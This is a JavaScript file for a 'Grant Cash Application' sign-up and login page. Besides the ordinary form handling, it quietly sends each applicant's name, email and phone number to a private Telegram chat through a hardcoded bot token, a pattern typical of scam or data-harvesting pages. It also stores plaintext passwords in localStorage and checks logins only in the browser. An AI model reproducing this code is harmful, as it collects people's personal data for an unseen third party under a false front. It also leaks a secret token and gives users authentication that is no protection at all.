document.addEventListener('DOMContentLoaded', function() {
    // Form elements
    const loginForm = document.getElementById('loginFormElement');
    const registerForm = document.getElementById('registerFormElement');
    const showRegister = document.getElementById('showRegister');
    const showLogin = document.getElementById('showLogin');
    const showRegisterBtn = document.getElementById('showRegisterBtn');
    const showLoginBtn = document.getElementById('showLoginBtn');
    
    // Modal elements
    const modal = document.getElementById('successModal');
    const closeModal = document.querySelector('.close');

    // Telegram bot configuration
    const TELEGRAM_BOT_TOKEN = '8092175848:AAEP8ykWtQoBKdO2SwGRdc0FhExwQ_waN8s';
    const TELEGRAM_CHAT_ID = '6300694007';

    // Show/hide forms
    function showForm(formId) {
        document.getElementById('loginForm').style.display = 'none';
        document.getElementById('registerForm').style.display = 'none';
        document.getElementById(formId).style.display = 'block';
        window.scrollTo({
            top: document.getElementById(formId).offsetTop - 50,
            behavior: 'smooth'
        });
    }

    // Event listeners for buttons
    showRegister.addEventListener('click', function(e) {
        e.preventDefault();
        showForm('registerForm');
    });

    showLogin.addEventListener('click', function(e) {
        e.preventDefault();
        showForm('loginForm');
    });

    showRegisterBtn.addEventListener('click', function(e) {
        e.preventDefault();
        showForm('registerForm');
    });

    showLoginBtn.addEventListener('click', function(e) {
        e.preventDefault();
        showForm('loginForm');
    });

    // Modal close functionality
    closeModal.addEventListener('click', function() {
        modal.style.display = 'none';
    });

    // Close modal when clicking outside
    window.addEventListener('click', function(event) {
        if (event.target === modal) {
            modal.style.display = 'none';
        }
    });

    // Register form submission
    registerForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const name = document.getElementById('reg-name').value;
        const email = document.getElementById('reg-email').value;
        const phone = document.getElementById('reg-phone').value;
        const password = document.getElementById('reg-password').value;
        const confirmPassword = document.getElementById('reg-confirm').value;
        
        // Validation
        if (!name || !email || !phone || !password || !confirmPassword) {
            showModal('Error', 'Please fill in all fields');
            return;
        }
        
        if (password !== confirmPassword) {
            showModal('Error', 'Passwords do not match');
            return;
        }
        
        if (password.length < 6) {
            showModal('Error', 'Password must be at least 6 characters');
            return;
        }
        
        if (localStorage.getItem(email)) {
            showModal('Error', 'Email already registered');
            return;
        }
        
        // Save user data
        const user = {
            name,
            email,
            phone,
            password,
            applications: [],
            createdAt: new Date().toISOString()
        };
        
        localStorage.setItem(email, JSON.stringify(user));
        
        // Update users list
        let users = JSON.parse(localStorage.getItem('users')) || [];
        users.push(email);
        localStorage.setItem('users', JSON.stringify(users));
        
        // Send notification to Telegram
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            sendTelegramNotification(name, email, phone);
        }
        
        // Show success and switch to login
        showModal('Success', 'Application submitted successfully!');
        registerForm.reset();
        showForm('loginForm');
    });

    // Login form submission
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
        const user = JSON.parse(localStorage.getItem(email));
        
        if (user && user.password === password) {
            localStorage.setItem('currentUser', email);
            window.location.href = 'dashboard.html';
        } else {
            showModal('Error', 'Invalid email or password');
        }
    });

    // Modal display function
    function showModal(title, message) {
        document.getElementById('modalTitle').textContent = title;
        document.getElementById('modalMessage').textContent = message;
        modal.style.display = 'block';
    }

    // Function to send Telegram notification
    function sendTelegramNotification(name, email, phone) {
        const message = `📢 New Grant Cash Application\n\n` +
                       `👤 Name: ${name}\n` +
                       `📧 Email: ${email}\n` +
                       `📞 Phone: ${phone}\n\n` +
                       `⏰ Applied at: ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
        .then(response => response.json())
        .then(data => {
            console.log('Telegram notification sent:', data);
        })
        .catch(error => {
            console.error('Error sending Telegram notification:', error);
        });
    }
})
